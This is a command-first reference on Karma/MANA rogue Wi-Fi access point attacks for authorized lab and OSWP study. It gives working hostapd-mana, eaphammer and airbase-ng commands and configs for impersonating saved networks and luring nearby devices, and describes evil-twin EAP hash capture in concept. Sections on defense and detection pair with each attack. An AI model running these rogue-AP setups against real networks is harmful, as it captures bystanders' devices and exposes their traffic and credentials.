# Karma / MANA Probe Attacks & Defense — Command-First Reference

> **Scope & authorization.** This is a knowledge-base entry for a *local, authorized* Wi-Fi
> security lab: your own gear, a sanctioned engagement with written scope, a CTF, or OSWP
> study. Karma/MANA/known-beacon techniques are *broadcast, collateral-heavy* attacks — a
> single run can pull in every phone in radio range, including people who are not in scope.
> **Never run loud/known-beacon modes on a shared RF space you are not authorized to test.**
> Always constrain to in-scope devices with a MAC allowlist (`--mac-whitelist`), use the
> lowest TX power that reaches the target, and prefer cloaked/filtered modes.
>
> For the **evil-twin / credential side this file is DETECTION + CONCEPT only.** It explains
> how the rogue-AP credential capture works so you can *detect and defend* against it and
> pass OSWP theory — it does **not** build a credential-phishing captive portal or harvester.
> The hard deliverable on that side is the **defense**: server-cert validation, EAP-TLS, PMF.

---

## 1. Concept (brief)

**Karma (2004, Dino Dai Zovi & Shane Macaulay).** Client devices with saved networks shout
"is NETWORK_X here?" via **directed probe requests**. A Karma AP listens and answers *yes* to
whatever name is asked, so the device auto-associates to the attacker. Original Karma only
answered **directed** probes and **only works against open (no-encryption) networks** — it has
no PSK/cert, so it cannot satisfy a WPA2-PSK or WPA2-Enterprise handshake by impersonation
alone.

**MANA (2014, Dominic White `singe` & Ian de Villiers, SensePost — DEF CON 22 "Manna from
Heaven").** Modern OSes stopped leaking their full saved-network list in directed probes and
increasingly rely on **broadcast** probes ("is *anyone* here?") plus passive scanning. MANA
extends Karma to also answer **broadcast** probes. It does this by **reconstructing each
device's Preferred Network List (PNL)**: it watches the directed probes a device *does* emit,
builds a per-device view of that device's PNL, then when the device sends a broadcast probe it
replies with a **directed probe response for every network in that device's PNL**. Clients
accept **one BSSID advertising many ESSIDs**, which is exactly what makes this work (and is
also the #1 detection signal — see §9).

**Key terms**
- **PNL (Preferred Network List):** the saved networks a device remembers and will auto-join.
- **Directed probe:** `Probe Request` naming a specific SSID. Leaks PNL membership.
- **Broadcast probe:** `Probe Request` with a wildcard/empty SSID. Leaks nothing by itself.
- **MANA default (quiet / per-device):** each device is answered only with the networks *it*
  probed for. Lower collateral, higher fidelity.
- **Loud mode:** build a **global/union PNL** from *all* observed devices and answer *every*
  broadcast with *every* collected SSID. Catches passive-only devices that share an SSID with a
  chattier neighbor — at the cost of huge collateral and noise.
- **Known Beacons:** when you have *no* PNL info, **beacon** a wordlist of common ESSIDs; any
  device whose PNL contains one of those names auto-joins.

**MANA's residual limitation:** it still can't help a device that *never* probes actively and
shares no SSID with any device that does. Loud mode and Known Beacons exist to cover that gap.

---

## 2. Lab gear & one-time prep (Mac + Kali + TP-Link RTL8188EUS)

The TP-Link RTL8188EUS (2.4 GHz, `rtl8xxxu`/`8188eu`) supports monitor + AP mode with the
right driver (`aircrack-ng/rtl8188eus` DKMS on modern kernels). Pass the USB adapter through to
the Kali VM (your lab is Kali at `192.168.64.2`).

```bash
# 0. Confirm the adapter and its capabilities
iw dev                              # find interface name, e.g. wlan0
iw list | grep -A10 "Supported interface modes"   # must list 'AP' and 'monitor'
lsusb | grep -i realtek
dmesg | tail -n 30                  # confirm driver bound (8188eu / rtl8xxxu)

# 1. Stop NetworkManager/wpa_supplicant from fighting you on that card
sudo airmon-ng check kill          # or: sudo systemctl stop NetworkManager wpa_supplicant
# (airmon-ng is convenient but flaky on realtek; the 'iw' path below is cleaner)

# 2. Monitor interface the clean way (preferred over 'airmon-ng start' on realtek)
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo iw dev wlan0 set channel 6
#   …or add a SEPARATE monitor vif so you keep the managed one for the AP:
sudo iw dev wlan0 interface add mon0 type monitor && sudo ip link set mon0 up
```

**Pro tip:** keep **two interfaces** when you can — one in monitor for recon, one in AP mode
for the rogue AP. A single RTL8188EUS can usually do one role at a time reliably; a second
cheap adapter (or the Mac's recon via `tcpdump`) removes channel-hopping conflicts.

---

## 3. Recon first — see the PNLs before you answer them

You answer PNLs better when you know what's being asked for. Capture probe requests:

```bash
# Watch who is probing and for what (directed probes reveal PNL entries)
sudo airodump-ng mon0                         # bottom "STATIONS … PROBES" column = PNL leakage
sudo airodump-ng mon0 --channel 1,6,11        # 2.4GHz only; constrain hopping

# Targeted probe-request sniff with tshark (SSID field of probe requests)
sudo tshark -i mon0 -Y 'wlan.fc.type_subtype==0x04' \
  -T fields -e wlan.sa -e wlan.ssid 2>/dev/null | sort -u
#   subtype 0x04 = Probe Request. Empty ssid = broadcast probe; named = directed (PNL leak).

# Identify the real target AP's channel/auth/cipher before impersonating (evil-twin recon)
sudo airodump-ng mon0 --essid "CorpWiFi"
```

Record **which clients emit directed probes** (MANA-attackable) vs. **passive-only** clients
(need loud/known-beacon). Note the **channel, hw_mode, cipher** of any real AP you'll clone.

---

## 4. hostapd-mana — the reference engine (exact config options)

`hostapd-mana` (SensePost's patched hostapd) is the canonical implementation. Options below are
from the project wiki. Note: the **upstream SensePost repo is deprecated**; use a maintained
fork (e.g. `adde88/hostapd-mana` / OpenWRT builds) or the version bundled inside **eaphammer**.

**MANA config options (exact names):**

| Option | Meaning |
|---|---|
| `enable_mana=1` | Turn on MANA per-device mode (each device answered only with the networks *it* probed for). |
| `mana_loud=1` | **Loud mode** — build a global PNL and advertise *all* collected networks to *all* devices. Add alongside `enable_mana=1`. One entry per SSID in loud mode. |
| `mana_outfile=/path/hostapd.manaout` | Log device activity for analysis. **Use a full path**, not a bare filename. |
| `track_sta_max_num=100` | Required to enable **taxonomy** (device-fingerprint) signatures in the outfile. |
| `track_sta_max_age=180` | Required with `track_sta_max_num` for taxonomy. |

**Outfile format:** `<MAC>, <SSID>, <RandomMAC? 1/0>, <TAXONOMY>` (taxonomy field only present
when the two `track_sta_*` options are set).

**Minimal per-device (quiet) MANA config** — `mana.conf`:

```ini
interface=wlan0
ssid=Free_WiFi            # the "base" SSID beaconed; Karma/MANA add the impersonated ones
channel=6
hw_mode=g
# --- MANA ---
enable_mana=1
mana_outfile=/root/lab/hostapd.manaout
track_sta_max_num=100
track_sta_max_age=180
```

**Loud-mode config** (catches passive devices; HIGH collateral — allowlist in scope!):

```ini
interface=wlan0
ssid=Free_WiFi
channel=6
hw_mode=g
enable_mana=1
mana_loud=1
```

**Run it:**

```bash
sudo hostapd ./mana.conf              # add -dd for debug/verbose
# then provide DHCP/DNS to anything that associates (open-network case):
sudo dnsmasq -C ./dnsmasq.conf -d     # hand out leases on the AP subnet
```

**Karma scope reminder:** plain Karma/MANA impersonation only completes for **open** networks —
there is no key to prove. For PSK/Enterprise targets you move to evil-twin (clone +
handshake/credential capture), which is **concept + detection only** in this KB (§7).

---

## 5. eaphammer — the fast path (same engine, friendlier flags)

eaphammer (`s0lst1c3`, Kali pkg **v1.14.0+**) wraps a bundled hostapd-mana and is the quickest
way to drive Karma/MANA/known-beacons. As of **v1.4.0** its Karma was replaced with a full
White/de Villiers **MANA** implementation; **`--karma` is now an alias for `--mana`**.

```bash
# Install (Kali)
sudo apt install eaphammer
# …or from source for the latest:
git clone https://github.com/s0lst1c3/eaphammer && cd eaphammer && sudo ./kali-setup

# One-time: generate the server cert used for any WPA-EAP impersonation theory/testing
./eaphammer --cert-wizard                 # or: --cert-wizard create | import | interactive
```

**MANA (quiet, per-device) — always scope with an allowlist:**

```bash
./eaphammer -i wlan0 -e "Free_WiFi" --cloaking full --mana --mac-whitelist whitelist.txt
#   --cloaking full  -> respond via directed probe responses only, NO beacons
#                        (beacons can't be MAC-filtered; cloaking shrinks collateral)
```

**Loud MANA** (passive-device coverage; dense-area tool; very noisy):

```bash
./eaphammer -i wlan0 -e "Free_WiFi" --cloaking full --mana --loud     # --singe == --loud
```

**Known Beacons** (no PNL info; beacon a wordlist of common ESSIDs):

```bash
# inline list
./eaphammer -i wlan0 -e apples --mana --known-beacons \
  --known-ssids oranges grapes pears bananas

# from a wordlist (one ESSID per line; common names work best)
./eaphammer -i wlan0 -e apples --mana --known-beacons \
  --known-ssids-file /usr/share/seclists/.../common-ssids.txt

# combine with loud for maximum reach (maximum collateral — authorized dense test only)
./eaphammer -i wlan0 --mana --loud -e apples --known-beacons --known-ssids-file wordlist.txt
```

**Known Beacon Burst (`forge-beacons`) — stealthier than `--known-beacons`:** a helper script
that fires short bursts of forged beacons per ESSID alongside a running `--mana` AP, so you
aren't continuously beaconing the whole wordlist.

```bash
./forge-beacons -i wlan1 --bssid de:ad:be:ef:13:37 \
  --known-essids-file known-s.txt --dst-addr <target-mac> --burst-count 5
```

**eaphammer flags worth knowing (v1.14.0):**
`-i/--interface`, `-e/--essid`, `-b/--bssid`, `-c/--channel`, `--hw-mode`,
`--cloaking {none,full,zeroes}`, `--auth {open,wpa-psk,wpa-eap,owe,owe-transition,owe-psk}`,
`--pmf {disable,enable,require}`, **`--mac-whitelist` / `--mac-blacklist`**,
`--ssid-whitelist` / `--ssid-blacklist`, `--karma`(=`--mana`), `--loud`(=`--singe`),
`--known-beacons`, `--known-ssids` / `--known-ssids-file`, `--essid-stripping {\r,\n,\t,\x20}`.
(Credential/portal flags exist — `--creds`, `--captive-portal`, `--hostile-portal` — but those
belong to the evil-twin side that this KB treats as concept/detection only.)

---

## 6. airbase-ng — the minimalist Karma (aircrack-ng, always on Kali)

When you want raw Karma without the framework, `airbase-ng` is on every Kali box:

```bash
sudo airbase-ng -c 6 -e "Free_WiFi" mon0        # single fake open AP (evil-twin style)
sudo airbase-ng -P -C 30 -e "Free_WiFi" mon0    # KARMA: respond to ALL probes
#   -P  : respond to all probes regardless of configured ESSID (classic Karma behavior)
#   -C <sec> : also BEACON the ESSIDs seen via directed probes, refreshing every <sec> seconds
#   -y  : opposite of -P — do NOT answer broadcast probes (answer only uniquely-requested APs)
```

`airbase-ng` creates an `at0` tap interface; you bridge/route + DHCP it for the open-network
case. It's great for understanding the mechanism; use eaphammer/hostapd-mana for real MANA
(PNL reconstruction, loud mode, known beacons), which `airbase-ng` does not implement.

---

## 7. Evil-twin / WPA-Enterprise credential capture — CONCEPT + DETECTION ONLY

**How it works (so you can detect and defend — not a build recipe).** Against **WPA2-
Enterprise** (802.1X/EAP), the rogue AP doesn't need the network password; it needs the
client to *speak EAP to it*. If the supplicant **does not validate the RADIUS server
certificate**, it will perform PEAP/EAP-TTLS/EAP-GTC against the attacker's RADIUS, leaking a
**MSCHAPv2 challenge/response (the "EAP hash")** or even a cleartext inner credential. SensePost
ported the old `freeradius-wpe` behavior into hostapd's RADIUS, so the MANA AP logs any EAP
hash to a file; a helper (`crackapd`) feeds it to `asleap`/hashcat against a wordlist. The
first association "fails," and after the hash cracks the device's retry succeeds.
EAP-GTC/TTLS-PAP can expose the password directly.

**Why this is in a *defense* doc:** every step above is defeated by **server-certificate
validation** on the client. That is the whole ballgame. The rest of §8–§9 is how to verify
you're defended and how to catch an attacker doing this.

> This KB intentionally stops at the concept. It does not provide a captive-portal credential-
> harvesting page or an `--hostile-portal` walkthrough. For OSWP practice, exercise the capture
> **only** against your own RADIUS/test clients, and spend your energy on the defenses below.

---

## 8. DEFENSE — paired with each attack (the real deliverable)

**Against Karma/MANA (open-network auto-join):**
- **Delete open/public networks from the PNL** after use; **turn off auto-join** for open
  networks (iOS: *Auto-Join Off* per network; Android: *Auto-connect* off; disable "connect to
  open networks automatically"). No PNL entry → nothing to impersonate.
- **Don't save open networks at all**; connect manually when needed.
- **"Ask to Join Networks"** so the device never silently associates.
- Prefer **cellular/known-WPA** over opportunistic open Wi-Fi.
- **MAC randomization helps privacy but NOT this attack by itself** — Vanhoef et al. (ASIACCS
  2016, *Why MAC Address Randomization is not Enough*) showed the **PNL still leaks** across
  randomized bursts, and scans *while connecting* to a preferred network are **not** randomized
  (Apple Platform Security). Randomization reduces tracking, not PNL-based Karma. The durable
  fix is **PNL hygiene + no auto-join**, not randomization.

**Against Known Beacons:** same PNL hygiene — a short, generic PNL (no "Free Airport WiFi",
"xfinitywifi", "attwifi", etc.) means a common-SSID wordlist has nothing to match. Remove
captive/portal SSIDs after travel.

**Against hidden-SSID leakage:** avoid marking networks hidden. Hidden networks force the
client to **actively probe the SSID by name everywhere**, handing its PNL to any Karma AP
(notably older Android treats manually-added networks as hidden).

**Against WPA2-Enterprise evil-twin credential capture (the §7 concept):**
- **Enforce server-certificate validation on every supplicant** (specify the expected **CA**
  *and* the RADIUS **server name/common-name**; "do not prompt the user to trust new servers").
  This single control defeats the PEAP/TTLS MANA-EAP capture — the attacker can't present a cert
  chaining to your CA with the right name.
- **Deploy via MDM/GPO** so users can't click-through an untrusted cert. User-driven trust is
  the failure mode attackers rely on.
- **Prefer EAP-TLS** (mutual cert auth): no password to steal, and the client's private key is
  required to impersonate it — the strongest option cited at SecTor and by SensePost.
- **Disable weak inner methods** (EAP-GTC, PAP) that expose cleartext.

**Against the deauth that herds clients onto the twin:**
- **Enable 802.11w / Protected Management Frames (PMF)** — set to **required** where clients
  support it. PMF authenticates management frames and **blocks forged deauthentication**, which
  is how evil-twins knock clients off the real AP. (eaphammer exposes `--pmf {disable,enable,
  require}` precisely because `require` is what frustrates the attack; audit for **missing PMF**.)

**Operator-side scoping (when YOU run the authorized test):**
- Always `--mac-whitelist` to in-scope devices; `--cloaking full` to suppress MAC-unfilterable
  beacons; lowest TX power; shortest run window. Known-beacon + loud have the highest collateral
  risk even with filtering — justify them in your rules of engagement.

---

## 9. DETECTION — catch Karma/MANA on your own turf

**The signature that gives it away:** **one BSSID advertising many different ESSIDs** in probe
responses (and/or a device answering probe requests for *every* SSID you ask for). That
one-to-many BSSID→ESSID mapping is the strongest single indicator.

**Active probe-based detector (fast, DIY):** emit directed probe requests for **random,
non-existent SSIDs**; a legitimate AP ignores them, a Karma/MANA AP answers them. Script with
`scapy`/`mdk4`-style probes and watch for probe responses to the fake names.

```bash
# quick sniff for one-BSSID-many-ESSID probe responses
sudo tshark -i mon0 -Y 'wlan.fc.type_subtype==0x05' \
  -T fields -e wlan.sa -e wlan.ssid | sort | uniq -c | sort -rn
#   subtype 0x05 = Probe Response; one SA (BSSID) paired with many SSIDs == suspicious
```

**Other WIPS indicators (SpecterOps Pt IV):**
- A **new/unexpected ESS** appearing — investigate (not conclusive alone).
- **Legacy PHY**: enterprise runs 802.11ac/ax; a new ESS in 802.11g/a/n often = pentest NIC.
- **Uncommon OUIs** of known adapters (Alfa, TP-Link, Panda, Realtek).
- **ESSID broadcast by a BSSID not on your authorized-BSSID inventory** (strong signal).
- **Default tool fingerprints**: eaphammer/WiFi-Pineapple default BSSIDs
  `00:11:22:33:44:00` / `00:11:22:33:44:55`, default ESSID `eaphammer`.
- **Deauth bursts** preceding a client move = the herding step.

**Tools:**
- **Kismet** — passive IDS; alerts include `APSPOOF`, `BSSIDSPOOFED`, `CHANNELCHANGE`,
  `PROBENOJOIN`; logs to JSON/SQLite for SIEM. (Kershaw: a non-beaconing Karma AP won't show in
  normal scan lists — you need the IDS view.)
- **nzyme** — rogue/evil-twin detection, **SSID monitoring** (look-alike names), **deauth
  monitoring**, and known-attack-platform detection (WiFi Pineapple, Pwnagotchi, Wifiphisher).
- **sentrygun / PiKarma / RogueDetection** — probe req/resp pattern + signal-strength anomaly
  + whitelist cross-reference detectors (need monitor-mode NICs).
- **Caveat:** WIPS only sees where sensors are deployed — public-space Karma against a roaming
  employee is invisible to corp WIDS. Client-side hygiene (§8) is the backstop.

---

## 10. Decision order (what pros try, and in what order)

1. **Recon PNLs** (§3). Who probes directed (MANA-able) vs passive-only? Note channels, and the
   real AP's channel/auth/cipher if evil-twin cloning.
2. **Scope the test**: build `whitelist.txt` of in-scope MACs. No allowlist → don't go loud.
3. **Quiet MANA first** (`--mana --cloaking full --mac-whitelist`): highest fidelity, lowest
   collateral. Enough for most directed-probe devices.
4. **Loud MANA** only if targets are passive and share SSIDs with chatty neighbors, and only in
   a dense area where you accept the noise — still allowlist-gated.
5. **Known Beacons** only when you have *no* PNL intel; start from a **common-SSID** wordlist;
   use **`forge-beacons` bursts** instead of continuous `--known-beacons` for stealth.
6. **Open network → done at association** (route + DHCP). **PSK/Enterprise → evil-twin**, which
   here is concept/detection only; the deliverable is proving the **defense** (cert validation,
   EAP-TLS, PMF) holds.
7. **Tear down**, wipe logs of out-of-scope devices, write up detections the blue team could
   have used.

---

## 11. Gotchas & pro tips

- **`--karma` == `--mana`**, **`--singe` == `--loud`** in eaphammer ≥1.4.0 — don't treat them as
  different attacks.
- **Copy-paste em-dashes bite:** blog prose renders `--mana` as `—-mana`; retype as two ASCII
  hyphens. Same trap breaks multi-line examples when a trailing `\` is dropped.
- **Flag spelling mismatch:** eaphammer uses `--known-ssids-file`; the `forge-beacons` helper
  uses `--known-essids-file`. Match the tool you're running.
- **Wordlist whitespace is significant** — trailing spaces become part of the ESSID. Trim files.
- **Karma only works on OPEN networks** — no amount of probe answering defeats a PSK/cert. For
  encrypted targets you're doing evil-twin (handshake/EAP), a different problem.
- **Loud mode scales badly:** in crowded RF or with a big antenna the response volume can exceed
  what client stacks handle; quiet/per-device is more reliable for a specific target.
- **realtek quirks:** `airmon-ng` is flaky on RTL8188EUS — set monitor/AP mode with `iw`
  instead; keep recon and AP on **separate** interfaces to avoid channel-hop conflicts.
- **Default BSSID/ESSID = instant detection.** If you must run authorized, change `--bssid` and
  `--essid` off the tool defaults (also good opsec practice to not look like a Pineapple).
- **Taxonomy needs both** `track_sta_max_num` *and* `track_sta_max_age`, or the outfile omits the
  fingerprint field.
- **PMF `require` is the client-herding killer** — if your test can't deauth, note that the
  target is PMF-protected and pivot to passive opportunistic capture.
- **Randomized MAC ≠ safe:** PNL still leaks; the win is deleting networks + no auto-join.

---

## Sources

- SensePost hostapd-mana wiki — *KARMA / MANA Attack Theory*: https://github.com/sensepost/hostapd-mana/wiki/KARMA---MANA-Attack-Theory
- SensePost hostapd-mana wiki — *Basic Mana Karma Options*: https://github.com/sensepost/hostapd-mana/wiki/Basic-Mana-Karma-Options
- SensePost blog — *Improvements in Rogue AP attacks – MANA 1/2* (2015): https://sensepost.com/blog/2015/improvements-in-rogue-ap-attacks-mana-1/2/
- SensePost blog — *Rogue Access Points, a how-to* (2013): https://sensepost.com/blog/2013/rogue-access-points-a-how-to/
- DEF CON 22 — White & de Villiers, *Manna from Heaven: Improving the state of wireless rogue AP attacks*: https://infocondb.org/con/def-con/def-con-22/manna-from-heaven-improving-the-state-of-wireless-rogue-ap-attacks
- SpecterOps — *Modern Wireless Tradecraft Pt I: Evil Twin and Karma*: https://specterops.io/blog/2019/10/28/modern-wireless-tradecraft-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks/
- SpecterOps — *Modern Wireless Tradecraft Pt II: MANA and Known Beacon Attacks*: https://specterops.io/blog/2019/11/04/modern-wireless-tradecraft-pt-ii-mana-and-known-beacon-attacks/
- SpecterOps — *Modern Wireless Tradecraft Pt III: Management Frame ACLs (MFACLs)*: https://specterops.io/blog/2019/11/12/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls/
- SpecterOps — *Modern Wireless Tradecraft Pt IV: Tradecraft and Defensive Strategy*: https://specterops.io/blog/2019/11/22/modern-wireless-tradecraft-pt-iv-tradecraft-and-defensive-strategy/
- Kali Tools — *eaphammer* (v1.14.0 package & flags): https://www.kali.org/tools/eaphammer
- eaphammer project (s0lst1c3): https://github.com/s0lst1c3/eaphammer
- aircrack-ng — *airbase-ng* man page (`-P`/`-C`/`-y`): https://man.archlinux.org/man/airbase-ng.8.en
- a3h1nt — *Karma & Mana: The Evil Twins and the Neighbours* (2023 practical): https://a3h1nt.github.io/2023/10/15/Karma-&-Mana-The-Evil-Twins-and-the-Neighbours.html
- Vanhoef et al., ASIACCS 2016 — *Why MAC Address Randomization is not Enough* (PNL leakage): https://lirias.kuleuven.be/bitstream/123456789/543617/1//asiaccs2016.pdf
- Apple Platform Security — *Wi-Fi privacy* (scans while connecting aren't randomized): https://support.apple.com/guide/security/secb9cb3140c/web
- Arista — *MAC Randomization Behavior and Impact* (whitepaper): https://www.arista.com/assets/data/pdf/Whitepapers/MAC-Randomization-Behavior-and-Impact.pdf
- Infosec Institute — *Attacking WPA2 Enterprise* (cert validation as primary control): https://www.infosecinstitute.com/resources/hacking/attacking-wpa2-enterprise/
- nzyme — *Wireless Capabilities* (rogue/evil-twin, SSID & deauth monitoring): https://www.nzyme.org/capabilities/wireless
- Mike Kershaw (Kismet) — *Wireless Intrusion Detection*, SharkFest: https://sharkfest.wireshark.org/retrospective/sfus/presentations13/SEC-17_Wireless-Intrusion-Detection_Mike-Kershaw.pdf
